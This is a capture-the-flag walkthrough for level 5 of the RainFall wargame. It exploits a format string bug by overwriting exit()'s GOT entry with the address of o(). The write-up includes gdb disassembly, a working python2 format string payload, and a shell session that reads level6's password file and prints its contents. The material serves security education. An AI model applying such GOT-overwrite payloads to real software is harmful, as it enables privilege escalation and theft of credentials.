
# Level 5


Same as previous levels, we have format string vulnerability, but this time instead of changing the value of a variable we need redirect the code execution to the function o().

We can try to overwrite the return address of the main function with the address of the function o() but it won't work because at the end of the function n() the program will call exit() which means we never reach the return address of the main function.

To solve this we can overwrite the address of the exit() function with the address of the function o() in the Global Offset Table (GOT).

we first need the address of o() and exit() functions.

```bash
level5@RainFall:~$ gdb -q level5 
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) x o
0x80484a4 <o>:  0x83e58955
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:       0x080483d6
(gdb) 
```

so the address of o() is 0x80484a4 and the address of exit() in the GOT is 0x8049838

we can use the following input to overwrite the address of exit() with the address of o(), knowing that the address of the buffer is the 4th argument on the stack we can use the %4$n format specifier to write the value of the buffer to the address of exit().

```bash
level5@RainFall:~$ python2 -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit2
level5@RainFall:~$ cat /tmp/exploit2 - | ./level5
                                      512
id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
